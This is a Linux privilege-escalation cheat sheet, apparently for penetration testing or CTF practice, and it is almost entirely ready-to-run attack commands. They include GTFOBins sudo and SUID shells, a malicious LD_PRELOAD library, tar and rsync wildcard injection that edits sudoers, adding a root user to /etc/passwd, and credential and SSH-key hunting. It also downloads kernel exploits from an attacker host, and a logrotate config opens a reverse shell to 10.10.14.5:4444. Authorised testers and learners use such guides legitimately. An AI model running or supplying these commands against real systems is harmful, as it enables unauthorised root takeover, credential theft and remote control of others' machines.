# Linux Privilege Escalation

Escalate privileges on Linux systems through misconfigurations, SUID binaries, sudo abuse, kernel exploits, and weak file permissions.
This phase follows initial access and aims to gain root-level access for complete system compromise.

## Quick Enumeration Commands

### Foothold Commands (Run First)
```bash
whoami
id
hostname
uname -a
sudo -l
env
echo $PATH
ip a
cat /etc/hosts
cat /etc/os-release
ps aux --sort=-%cpu | head -n 20
w
lastlog
```

### System Information
```bash
# OS and kernel version
uname -r
cat /etc/os-release
lsb_release -a

# CPU information
lscpu

# Mounted drives and file systems
lsblk
df -h
cat /etc/fstab
mount

# Network configuration
ip a
route -n
arp -a
cat /etc/resolv.conf
ss -tulpen
netstat -tulpen
```

## Automated Enumeration Tools

### LinPEAS
```bash
# Download and run
wget http://10.10.14.5/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### LinEnum
```bash
wget http://10.10.14.5/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

### Linux Smart Enumeration (LSE)
```bash
wget http://10.10.14.5/lse.sh
chmod +x lse.sh
./lse.sh -l 1  # Level 1 (basic)
./lse.sh -l 2  # Level 2 (detailed)
```

### pspy (Process Monitoring)
```bash
# Monitor processes without root
wget http://10.10.14.5/pspy64
chmod +x pspy64
./pspy64 -pf -i 1000
```

## Sudo Abuse

### Check Sudo Permissions
```bash
sudo -l
sudo -V  # Check sudo version for CVEs
```

### Sudo NOPASSWD Exploitation
```bash
# If sudo -l shows NOPASSWD for a binary, check GTFOBins
# Example: sudo NOPASSWD: /usr/bin/find
sudo find . -exec /bin/bash \; -quit
```

### Sudo LD_PRELOAD
```bash
# If sudo -l shows: env_keep+=LD_PRELOAD
# Create malicious shared library
cat > shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -nostartfiles -o /tmp/shell.so shell.c
sudo LD_PRELOAD=/tmp/shell.so <any_sudo_binary>
```

### Sudo Vulnerabilities

#### CVE-2021-3156 (Baron Samedit)
```bash
# Affects sudo versions < 1.9.5p2
# Check version
sudo -V

# Exploit
wget http://10.10.14.5/CVE-2021-3156.sh
chmod +x CVE-2021-3156.sh
./CVE-2021-3156.sh
```

## SUID / SGID Binaries

### Find SUID Binaries
```bash
# Find SUID files
find / -perm -4000 -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# Find SGID files
find / -perm -2000 -type f 2>/dev/null
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

### GTFOBins Exploitation
```bash
# Check found SUID binaries against GTFOBins
# https://gtfobins.github.io/

# Example: find with SUID
find . -exec /bin/bash -p \; -quit

# Example: vim with SUID
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-p")'

# Example: python with SUID
python -c 'import os; os.setuid(0); os.system("/bin/bash -p")'

# Example: perl with SUID
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

### Match Installed Packages with GTFOBins
```bash
# List installed packages
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' > installed_pkgs.list

# Check against GTFOBins
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d'); do 
    if grep -q "$i" installed_pkgs.list; then 
        echo "Check GTFO for: $i"
    fi
done
```

## Linux Capabilities

### Find Capabilities
```bash
# Find all capabilities
getcap -r / 2>/dev/null

# Common dangerous capabilities
# cap_setuid - allows changing UID
# cap_dac_override - bypass file permissions
# cap_sys_admin - various admin operations
```

### Exploit Capabilities
```bash
# Example: python with cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Example: perl with cap_setuid
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# Example: tar with cap_dac_override
tar -cvf /dev/null /etc/shadow --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

## Privileged Groups

### Docker Group
```bash
# Check if user is in docker group
id

# List docker images
docker image list

# Mount host root filesystem
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash

# Alternative method
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

### LXD Group
```bash
# Check if user is in lxd group
id

# Build Alpine image on attacker machine
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
./build-alpine

# Transfer to target and import
lxc image import ./alpine*.tar.gz --alias myimage
lxc image list

# Create privileged container
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh

# Access host filesystem
cd /mnt/root
```

### ADM Group
```bash
# ADM group can read log files
# Search logs for credentials
grep -r "password" /var/log 2>/dev/null
grep -r "pass" /var/log 2>/dev/null
```

### Disk Group
```bash
# Disk group has raw access to block devices
# Read entire disk
debugfs /dev/sda1
debugfs: cat /etc/shadow
debugfs: cat /root/.ssh/id_rsa
```

## Scheduled Tasks (Cron)

### Enumerate Cron Jobs
```bash
# Check user crontab
crontab -l

# Check system crontabs
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*

# Check all user crontabs
for user in $(cut -f1 -d: /etc/passwd); do 
    crontab -u $user -l 2>/dev/null
done

# Check systemd timers
systemctl list-timers --all
```

### Find Writable Cron Scripts
```bash
# Find world-writable files
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

# Check permissions on cron scripts
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
```

### Tar Wildcard Exploitation
```bash
# If cron job uses: tar -zcf backup.tar.gz *
# Create malicious files
echo 'echo "user ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1

# Wait for cron to run, then check sudo
sudo -l
```

## Weak File Permissions

### Writable /etc/passwd
```bash
# Check if /etc/passwd is writable
ls -la /etc/passwd

# Generate password hash
openssl passwd -1 -salt salt password123

# Add new root user
echo 'newroot:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:root:/root:/bin/bash' >> /etc/passwd

# Or remove password for existing user
# Change: root:x:0:0:root:/root:/bin/bash
# To: root::0:0:root:/root:/bin/bash
su root  # No password required
```

### Readable /etc/shadow
```bash
# Check if shadow is readable
cat /etc/shadow

# Copy hashes and crack offline
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
hashcat -m 1800 shadow.txt rockyou.txt
```

### Writable /etc/shadow
```bash
# Generate new password hash
mkpasswd -m sha-512 password123

# Replace root hash in /etc/shadow
# Or remove hash entirely for passwordless login
```

### SSH Keys
```bash
# Find SSH private keys
find / -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null

# Check permissions
ls -la ~/.ssh/
ls -la /home/*/.ssh/

# If /root/.ssh is writable, add your public key
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
ssh root@target
```

## Credential Hunting

### Search for Passwords in Files
```bash
# Search for password patterns
grep -R --line-number -i "pass\|pwd\|secret\|token" /etc /home 2>/dev/null

# Search in config files
find / -type f -name "*.conf" -exec grep -H "pass" {} \; 2>/dev/null
find / -type f -name "*.config" -exec grep -H "pass" {} \; 2>/dev/null

# Search in scripts
find / -type f -name "*.sh" -exec grep -H "pass" {} \; 2>/dev/null

# Search for backup files
find / -type f \( -name "*.bak" -o -name "*.backup" -o -name "*.old" \) 2>/dev/null
```

### History Files
```bash
# Find history files
find / -type f \( -name "*_history" -o -name ".bash_history" -o -name ".zsh_history" \) 2>/dev/null

# Read history files
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.python_history
```

### Environment Variables
```bash
# Check environment for secrets
env | sort
printenv
```

### Database Credentials
```bash
# Common database config locations
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
cat /etc/mysql/my.cnf
cat ~/.my.cnf
```

## Kernel Exploits

### Check Kernel Version
```bash
uname -r
uname -a
cat /proc/version
```

### Dirty Pipe (CVE-2022-0847)
```bash
# Affects kernels 5.8 to 5.17
# Check version
uname -r

# Download exploit
wget http://10.10.14.5/dirtypipe.c
gcc dirtypipe.c -o dirtypipe

# Exploit SUID binary (e.g., /usr/bin/su)
./dirtypipe /usr/bin/su
```

### Dirty COW (CVE-2016-5195)
```bash
# Affects kernels 2.6.22 to 4.8.3
wget http://10.10.14.5/dirtycow.c
gcc -pthread dirtycow.c -o dirtycow -lcrypt
./dirtycow
```

### Netfilter Exploits

#### CVE-2021-22555
```bash
# Affects kernels 2.6 to 5.11
wget http://10.10.14.5/cve-2021-22555.c
gcc -m32 -static cve-2021-22555.c -o exploit
./exploit
```

#### CVE-2022-25636
```bash
# Affects kernels 5.4 to 5.6.10
git clone https://github.com/Bonfee/CVE-2022-25636.git
cd CVE-2022-25636
make
./exploit
```

#### CVE-2023-32233
```bash
# Affects kernels up to 6.3.1
git clone https://github.com/Liuk3r/CVE-2023-32233
cd CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
./exploit
```

## PATH Hijacking

### Check PATH Variable
```bash
echo $PATH

# If PATH contains writable directory or current directory (.)
# Create malicious binary with common name
cat > /tmp/ls << EOF
#!/bin/bash
/bin/bash -p
EOF
chmod +x /tmp/ls

# If /tmp is in PATH before /bin
export PATH=/tmp:$PATH
ls  # Executes malicious /tmp/ls
```

### Hijack Binary in Sudo Context
```bash
# If sudo -l shows a script that calls binaries without full path
# Example: sudo /usr/local/bin/backup.sh (which calls "tar")
cat > /tmp/tar << EOF
#!/bin/bash
/bin/bash -p
EOF
chmod +x /tmp/tar
export PATH=/tmp:$PATH
sudo /usr/local/bin/backup.sh
```

## NFS Root Squashing

### Check NFS Exports
```bash
# On target
cat /etc/exports
showmount -e localhost

# Look for no_root_squash option
```

### Exploit no_root_squash
```bash
# On attacker machine (as root)
mkdir /tmp/nfs
mount -t nfs target:/share /tmp/nfs

# Create SUID binary
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash

# On target
/share/bash -p
```

## Wildcard Injection

### Tar Wildcard Exploitation
```bash
# If script uses: tar -czf backup.tar.gz *
echo 'echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' > privesc.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh privesc.sh"
```

### Rsync Wildcard Exploitation
```bash
# If script uses: rsync -a * /backup/
echo "user ALL=(ALL) NOPASSWD: ALL" > exploit
echo "" > "-e sh exploit"
```

## Container Escape

### Check if Inside Container
```bash
# Check for container indicators
cat /proc/1/cgroup
ls -la /.dockerenv
cat /proc/self/mountinfo | grep docker
```

### Docker Socket Escape
```bash
# If /var/run/docker.sock is accessible
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

### Privileged Container Escape
```bash
# Check if container is privileged
capsh --print

# If privileged, access host devices
fdisk -l
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host
```

## Miscellaneous Techniques

### Tmux/Screen Session Hijacking
```bash
# List tmux sessions
tmux ls

# Attach to session
tmux attach -t <session>

# List screen sessions
screen -ls

# Attach to screen session
screen -x <session>
```

### Python Library Hijacking
```bash
# If script runs as root and imports from writable directory
# Check PYTHONPATH
echo $PYTHONPATH

# Create malicious module
cat > /tmp/exploit.py << EOF
import os
os.setuid(0)
os.system("/bin/bash -p")
EOF

# If script imports "exploit"
export PYTHONPATH=/tmp:$PYTHONPATH
```

### Logrotate Exploitation
```bash
# If logrotate runs as root with writable config
# Create malicious logrotate config
cat > /etc/logrotate.d/exploit << EOF
/tmp/dummy.log {
    daily
    rotate 1
    create 0644 root root
    postrotate
        /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
    endscript
}
EOF

# Create dummy log
touch /tmp/dummy.log
```

## Notes

**Enumeration is Key:**
- Spend time on thorough enumeration before attempting exploits
- Automated tools like LinPEAS can miss context-specific misconfigurations
- Always check sudo -l, SUID binaries, cron jobs, and file permissions

**SUID/SGID Binaries:**
- Not all SUID binaries are exploitable
- Cross-reference findings with GTFOBins for exploitation techniques
- Custom SUID binaries are often more vulnerable than system binaries

**Kernel Exploits:**
- Use as last resort due to system crash risk
- Always check kernel version and patch level first
- Test in lab environment before production use

**Sudo Abuse:**
- Even seemingly harmless binaries can be abused (find, vim, less, more, etc.)
- LD_PRELOAD is a powerful technique when env_keep is set
- Check for sudo version vulnerabilities (Baron Samedit, etc.)

**Privileged Groups:**
- Docker, LXD, disk, and adm groups provide easy privilege escalation paths
- Always check group memberships with `id` command
- Container escapes are often simpler than kernel exploits

**Credentials:**
- Check history files, config files, backup files, and environment variables
- Database credentials are often stored in web application configs
- SSH keys may be readable or writable

**Cron Jobs:**
- Monitor with pspy to see what runs and when
- Check for writable scripts or directories in cron paths
- Wildcard injection in tar/rsync commands is common

**PATH Hijacking:**
- Works when scripts call binaries without absolute paths
- Requires writable directory in PATH before legitimate binary location
- Particularly effective with sudo if env_keep includes PATH
